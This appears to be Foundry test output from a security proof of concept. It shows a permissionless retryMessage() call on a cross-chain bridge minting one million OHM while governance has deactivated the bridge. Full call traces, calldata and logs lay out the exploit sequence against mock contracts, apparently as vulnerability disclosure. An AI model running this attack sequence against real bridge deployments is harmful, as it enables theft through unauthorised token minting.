No files changed, compilation skipped

Ran 1 test for test/CrossChainBridge_POC.t.sol:CrossChainBridgePOCTest
[PASS] test_2_CRITICAL_RetryMessage_Bypasses_BridgeActive() (gas: 118578)
Logs:
  === SETUP COMPLETE ===
  Bridge address: 0xfF9FA8f363F78f9F5658971A4F357ad95130D1F5
  OHM address: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
  Bridge active: true
  OHM total supply (initial): 100 OHM
  
=== TEST 2: CRITICAL EXPLOIT - retryMessage bypasses bridgeActive ===
  [STEP 1] Failed message injected into failedMessages
           payloadHash stored: TRUE
           Target: attacker receives 1000000 OHM
  [STEP 2] Governance deactivated bridge (bridgeActive = false)
           OHM supply before attack: 100 OHM
           sendOhm() is now blocked - governance believes bridge is safe
  [STEP 3] Attacker calls retryMessage() - PERMISSIONLESS...
  
=== EXPLOIT RESULT ===
  OHM supply before: 100 OHM
  OHM supply after: 1000100 OHM
  OHM illegally minted: 1000000 OHM
  Attacker balance: 1000000 OHM
  Bridge still deactivated: true
  
[CRITICAL] EXPLOIT CONFIRMED: OHM minted despite bridgeActive = false
  [CRITICAL] Invariant violated: NOT(bridgeActive) => NOT(mint) is FALSE

Traces:
  [153488] CrossChainBridgePOCTest::test_2_CRITICAL_RetryMessage_Bypasses_BridgeActive()
    ├─ [0] console::log("\n=== TEST 2: CRITICAL EXPLOIT - retryMessage bypasses bridgeActive ===") [staticcall]
    │   └─ ← [Stop]
    ├─ [23224] CrossChainBridgePOCHarness::injectFailedMessage(101, 0x000000000000000000000000000000000000abcdff9fa8f363f78f9f5658971a4f357ad95130d1f5, 1, 0xa51d84af0da915e1b6141a3a37c73437c473092e0d7ef7ed3782dc90c1eaf35b)
    │   └─ ← [Stop]
    ├─ [1243] CrossChainBridgePOCHarness::failedMessages(101, 0x000000000000000000000000000000000000abcdff9fa8f363f78f9f5658971a4f357ad95130d1f5, 1) [staticcall]
    │   └─ ← [Return] 0xa51d84af0da915e1b6141a3a37c73437c473092e0d7ef7ed3782dc90c1eaf35b
    ├─ [0] console::log("[STEP 1] Failed message injected into failedMessages") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("         payloadHash stored: TRUE") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("         Target: attacker receives", 1000000 [1e6], "OHM") [staticcall]
    │   └─ ← [Stop]
    ├─ [2340] MockOHM::totalSupply() [staticcall]
    │   └─ ← [Return] 100000000000 [1e11]
    ├─ [0] VM::prank(0x0000000000000000000000000000000000001111)
    │   └─ ← [Return]
    ├─ [8578] CrossChainBridgePOCHarness::setBridgeStatus(false)
    │   ├─ emit BridgeStatusSet(isActive_: false)
    │   └─ ← [Stop]
    ├─ [393] CrossChainBridgePOCHarness::bridgeActive() [staticcall]
    │   └─ ← [Return] false
    ├─ [0] console::log("[STEP 2] Governance deactivated bridge (bridgeActive = false)") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("         OHM supply before attack:", 100, "OHM") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("         sendOhm() is now blocked - governance believes bridge is safe") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("[STEP 3] Attacker calls retryMessage() - PERMISSIONLESS...") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::prank(0x0000000000000000000000000000000000002222)
    │   └─ ← [Return]
    ├─ [66412] CrossChainBridgePOCHarness::retryMessage(101, 0x000000000000000000000000000000000000abcdff9fa8f363f78f9f5658971a4f357ad95130d1f5, 1, 0x000000000000000000000000000000000000000000000000000000000000222200000000000000000000000000000000000000000000000000038d7ea4c68000)
    │   ├─ [22612] MockMINTR::increaseMintApproval(CrossChainBridgePOCHarness: [0xfF9FA8f363F78f9F5658971A4F357ad95130D1F5], 1000000000000000 [1e15])
    │   │   └─ ← [Stop]
    │   ├─ [30987] MockMINTR::mintOhm(0x0000000000000000000000000000000000002222, 1000000000000000 [1e15])
    │   │   ├─ [27578] MockOHM::mint(0x0000000000000000000000000000000000002222, 1000000000000000 [1e15])
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0000000000000000000000000000000000002222, amount: 1000000000000000 [1e15])
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   ├─ emit BridgeReceived(receiver_: 0x0000000000000000000000000000000000002222, amount_: 1000000000000000 [1e15], srcChain_: 101)
    │   ├─ emit RetryMessageSuccess(srcChainId_: 101, srcAddress_: 0x000000000000000000000000000000000000abcdff9fa8f363f78f9f5658971a4f357ad95130d1f5, nonce_: 1, payloadHash_: 0xa51d84af0da915e1b6141a3a37c73437c473092e0d7ef7ed3782dc90c1eaf35b)
    │   └─ ← [Stop]
    ├─ [340] MockOHM::totalSupply() [staticcall]
    │   └─ ← [Return] 1000100000000000 [1e15]
    ├─ [541] MockOHM::balanceOf(0x0000000000000000000000000000000000002222) [staticcall]
    │   └─ ← [Return] 1000000000000000 [1e15]
    ├─ [0] console::log("\n=== EXPLOIT RESULT ===") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("OHM supply before:", 100, "OHM") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("OHM supply after:", 1000100 [1e6], "OHM") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("OHM illegally minted:", 1000000 [1e6], "OHM") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Attacker balance:", 1000000 [1e6], "OHM") [staticcall]
    │   └─ ← [Stop]
    ├─ [393] CrossChainBridgePOCHarness::bridgeActive() [staticcall]
    │   └─ ← [Return] false
    ├─ [0] console::log("Bridge still deactivated:", true) [staticcall]
    │   └─ ← [Stop]
    ├─ [393] CrossChainBridgePOCHarness::bridgeActive() [staticcall]
    │   └─ ← [Return] false
    ├─ [0] console::log("\n[CRITICAL] EXPLOIT CONFIRMED: OHM minted despite bridgeActive = false") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("[CRITICAL] Invariant violated: NOT(bridgeActive) => NOT(mint) is FALSE") [staticcall]
    │   └─ ← [Stop]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.15ms (613.44µs CPU time)

Ran 1 test suite in 11.68ms (2.15ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
